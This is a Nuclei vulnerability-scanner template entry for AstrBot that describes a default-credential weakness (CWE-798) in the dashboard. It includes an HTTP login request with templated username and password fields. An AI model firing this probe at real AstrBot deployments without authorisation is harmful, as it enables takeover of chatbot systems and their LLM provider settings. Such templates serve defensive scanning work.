# Nuclei Template: AstrBot - Default Login
**Template ID:** astrbot-default-login
**Vulnerability Class:** Use of Hard-coded Credentials
**Severity:** High
**CWE:** CWE-798
**Source:** Nuclei Template (`astrbot-default-login.yaml`)

## Vulnerability Information & PoC

## Description
AstrBot contains a default login vulnerability. An attacker can access the AstrBot dashboard using default credentials and gain control over the chatbot framework, modify configurations, manage LLM providers, and execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/
POST /api/auth/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"username":"{{username}}","password":"{{password}}"}
```

## References
- https://github.com/Soulter/AstrBot
